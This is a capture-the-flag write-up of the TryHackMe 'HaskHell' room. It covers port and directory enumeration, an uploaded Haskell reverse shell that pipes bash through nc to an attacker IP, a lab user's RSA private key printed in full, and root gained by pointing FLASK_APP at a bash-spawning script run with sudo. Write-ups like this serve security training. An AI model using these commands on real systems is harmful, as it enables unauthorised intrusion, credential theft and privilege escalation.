# 44 - HaskHell (flask env variable for priv esc)

Room Link --> [https://tryhackme.com/room/haskhell](https://tryhackme.com/room/haskhell)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn -n -vv 10.10.57.56 -p- -T5

PORT     STATE SERVICE       REASON
22/tcp   open  ssh           syn-ack
5001/tcp open  commplex-link syn-ack
```
{% endcode %}

Navigating to `http://10.10.57.56:5001` .

<figure><img src=".gitbook/assets/image (311).png" alt=""><figcaption></figcaption></figure>

#### FFUF enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
ffuf -u http://10.10.57.56:5001/FUZZ -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -fc 403,400 -t 500 -ic

/submit
```
{% endcode %}

So i googled and got a Haskell rev shell from the Github [link](https://github.com/passthehashbrowns/Haskell-Reverse-Shell/blob/master/reverse-shell.hs), i uploaded it, nc was listening and BOOM! i got shell.

<figure><img src=".gitbook/assets/image (312).png" alt=""><figcaption></figcaption></figure>

But the shell kept timing out after like 20 seconds :(

Then i used [revShells](https://www.revshells.com/) to generate a Haskell shell:

{% code overflow="wrap" lineNumbers="true" %}
```bash
module Main where

import System.Process

main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc 10.18.88.214 1234 >/tmp/f"
```
{% endcode %}

Uploaded it and got a stable shell.

<figure><img src=".gitbook/assets/image (313).png" alt=""><figcaption></figcaption></figure>

### Priv Esc to Proff user

So i ran `linPEAS.sh` on the box, and i found proff private ssh keys :)

<figure><img src=".gitbook/assets/image (314).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" lineNumbers="true" %}
```
flask@haskhell:~$ cat /home/prof/.ssh/id_rsa
cat /home/prof/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA068E6x8/vMcUcitx9zXoWsF8WjmBB04VgGklNQCSEHtzA9cr
94rYpUPcxxxYyw/dAii0W6srQuRCAbQxO5Di+tv9aWXmBGMEt0/3tOE7D09RhZGQ
b68lAFDjSSJaVlVzPi+waotyP2ccVJDjXkwK0KIm6RsACIOhM9GtI2wyZ6vOg4ss
Nb+7UY60iOkcOAWP09Omzjc2q7hcE6CuV6f7+iObamfGlZ4QQ5IvUj0etStDD6iU
WQX4vYewYqUz8bedccFvpC6uP2FGvDONYXrLWWua7wlwSgOqeXXxkG7fxVqYY2++
6ZVm8RE7TpPNxsQNDwpnxOiwTxGMgCrIMxgRVwIDAQABAoIBAQCTLXbf+wQXvtrq
XmaImQSKRUiuepjJeXLdqz1hUpo7t3lKTEqXfAQRM9PG5GCgHtFs9NwheCtGAOob
wSsR3TTTci0JIP4CQs4+nez96DNl+6IUmhawcDfrtlGwwZ/JsvPDYujnyziN+KTr
7ykGoRxL3tHq9Qja4posKzaUEGAjTz8NwrhzB6xatsmcWBV0fFoWzpS/xWzW3i7F
gAoYxc6+4s5bKHsJima2Aj5F3XtHfipkMdBvbl+sjGllgiQn/oEjYMIX5wc7+se2
o7FERO2oy3I5jUOlULsr9BwQpNFA2Qenc4Wc7ghb0LfCVaUs/RHQ7IQ4F3yp/G67
54oLue6hAoGBAPCe+WsnOXzhwQ9WXglhfztDR1lcwSFMeHZpcxYUVqmVEi2ZMLll
B67SCri9lHHyvBtrH7YmZO5Q9UcGXdLCZGmbkJUdX2bjqV0zwwx1qOiVY8LPnZSJ
LJN+0p1dRHsO3n4vTHO8mVuiM5THi6pcgzSTggIhS+e1ks7nlQKiBuD/AoGBAOE2
kwAMtvI03JlkjvOHsN5IhMbOXP0zaRSrKZArDCcqDojDL/AQltQkkLtQPdUPJgdY
3gOkUJ2BCHNlIsAtUjrTj+T76N512rO2sSidOEXRDCc+g/QwdgENiq/w9JroeWFc
g9qM3f2cl/EkjxRgiyuTfK6mbzcuMSveX4LfCXepAoGAd2MZc+4ZWvoUNUzwCY2D
eF8QVqlr9d6gYng9rvXWbfvV8iPxBfu3zSjQQwtlTQhYBu6m5FS2fXxTxrLE+J6U
/cU+/o19WWqaDPFy1IrIjOYagn1KvXk2UdR6IbQ2FyywfkFvmHk6Sjn3h9leVd/j
BcIunmnw5H214s0KpSzJZvcCgYA5Ca9VNeMnmIe+OZ+Swezjfw5Ro3YdkmWsnGTc
ZGqhiJ9Bt91uOWVZuSEGr53ZVgrVlYY0+eqI2WMghp60eUX4LBinb71cihCnrz9S
/+5+kCE51zVoJNXeEmXrhWUNzo7fP6UNNtwKHRzGL/IkwQa+NI5BVVmZahN9/sXF
yWMGcQKBgQDheyI7eKTDMsrEXwMUpl5aiwWPKJ0gY/2hS0WO3XGQtx6HBwg6jJKw
MMn8PNqYKF3DWex59PYiy5ZL1pUG2Y+iadGfIbStSZzN4nItF5+yC42Q2wlhtwgt
i4MU8bepL/GTMgaiR8RmU2qY7wRxfK2Yd+8+GDuzLPEoS7ONNjLhNA==
-----END RSA PRIVATE KEY-----
```
{% endcode %}

<figure><img src=".gitbook/assets/image (315).png" alt=""><figcaption></figcaption></figure>

### Priv Esc to root

#### exploiting Flask

`sudo -l` - prof can run a cmd as root.

<figure><img src=".gitbook/assets/image (316).png" alt=""><figcaption></figcaption></figure>

But when we run it:&#x20;

<figure><img src=".gitbook/assets/image (317).png" alt=""><figcaption></figcaption></figure>

The `FLASK_APP` is also an environment variable just like `SHELL, TERM etc..` .

we will create a python file then add it as a value for the `FLASK_APP` env variable value.

{% code overflow="wrap" lineNumbers="true" %}
```bash
prof@haskhell:~$ echo 'import os; os.system("/bin/bash")' > shell.py
prof@haskhell:~$ ls
__pycache__  shell.py  user.txt
prof@haskhell:~$ chmod +x shell.py 
prof@haskhell:~$ ls
__pycache__  shell.py  user.txt
prof@haskhell:~$ export FLASK_APP=shell.py
prof@haskhell:~$ sudo /usr/bin/flask run
root@haskhell:~# id
uid=0(root) gid=0(root) groups=0(root)
root@haskhell:~# 

```
{% endcode %}

Done!

